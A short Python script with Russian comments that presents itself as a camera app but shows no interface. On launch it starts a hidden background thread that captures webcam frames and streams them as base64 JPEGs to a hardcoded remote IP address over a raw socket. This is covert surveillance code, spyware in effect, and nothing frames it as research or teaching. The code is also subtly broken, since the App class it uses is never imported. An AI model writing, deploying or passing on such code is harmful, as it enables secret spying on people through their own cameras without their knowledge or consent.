import cv2
import socket
import base64
import time
from threading import Thread

def send_video():
    cap = cv2.VideoCapture(0)  # Открываем камеру
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('178.95.15.120', 12345))  # Подключение к прокси-серверу

    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, img_encoded = cv2.imencode('.jpg', frame)
        img_bytes = img_encoded.tobytes()
        img_base64 = base64.b64encode(img_bytes).decode('utf-8')
        client_socket.sendall(img_base64.encode('utf-8'))
        time.sleep(0.05)  # Задержка между кадрами

    cap.release()
    client_socket.close()

def start_background_service():
    Thread(target=send_video, daemon=True).start()

class CameraApp(App):
    def build(self):
        start_background_service()
        return None

    def on_stop(self):
        pass

if __name__ == '__main__':
    CameraApp().run()

